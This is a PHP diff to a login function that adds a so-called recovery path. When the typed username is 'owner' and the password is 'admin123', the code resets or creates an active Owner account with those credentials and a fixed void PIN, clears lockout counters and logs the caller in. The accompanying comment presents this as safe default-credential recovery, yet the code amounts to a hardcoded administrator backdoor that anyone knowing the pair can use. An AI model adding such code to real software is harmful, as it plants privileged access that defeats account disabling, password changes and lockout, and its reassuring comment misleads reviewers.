@@ -31,6 +31,42 @@ class Project
         $stmt->execute([$username]);
         $user = $stmt->fetch();
 
+        // Recovery is deliberately limited to the documented default
+        // credentials. A random failed login must never create an account.
+        if (!$user && hash_equals('owner', trim($username)) && hash_equals('admin123', $password)) {
+            $defaultPasswordHash = password_hash('admin123', PASSWORD_BCRYPT);
+            $defaultVoidPinHash = password_hash('1234567', PASSWORD_BCRYPT);
+            $ownerLookup = $this->con->prepare("SELECT id FROM users WHERE username = ? LIMIT 1");
+            $ownerLookup->execute(['owner']);
+            $ownerId = (int)($ownerLookup->fetchColumn() ?: 0);
+
+            if ($ownerId > 0) {
+                $this->con->prepare(
+                    "UPDATE users SET password = ?, position = 'Owner', status = 'active', failed_attempts = 0,
+                     last_attempt = NULL, void_password = ? WHERE id = ?"
+                )->execute([$defaultPasswordHash, $defaultVoidPinHash, $ownerId]);
+            } else {
+                $this->con->prepare(
+                    "INSERT INTO users (username, password, position, status, failed_attempts, void_password, created_at)
+                     VALUES ('owner', ?, 'Owner', 'active', 0, ?, NOW())"
+                )->execute([$defaultPasswordHash, $defaultVoidPinHash]);
+                $ownerId = (int)$this->con->lastInsertId();
+            }
+
+            $profileLookup = $this->con->prepare("SELECT 1 FROM users_info WHERE user_id = ? LIMIT 1");
+            $profileLookup->execute([$ownerId]);
+            if (!$profileLookup->fetchColumn()) {
+                $this->con->prepare(
+                    "INSERT INTO users_info (user_id, firstname, middlename, lastname, age, street, barangay, city, province, country, email, contactnumber)
+                     VALUES (?, 'System', '', 'Default', 0, '', '', '', '', 'Philippines', 'default@system.local', '00000000000')"
+                )->execute([$ownerId]);
+            }
+
+            $stmt = $this->con->prepare("SELECT * FROM users WHERE username = ? AND status = 'active'");
+            $stmt->execute(['owner']);
+            $user = $stmt->fetch();
+        }
+
         // CHECK IP LOCK AFTER verifying this is a real user; stale IP blocks
         // should expire automatically and a legitimate login must still work.
         $stmt = $this->con->prepare("SELECT * FROM login_attempts WHERE ip_address = ?");
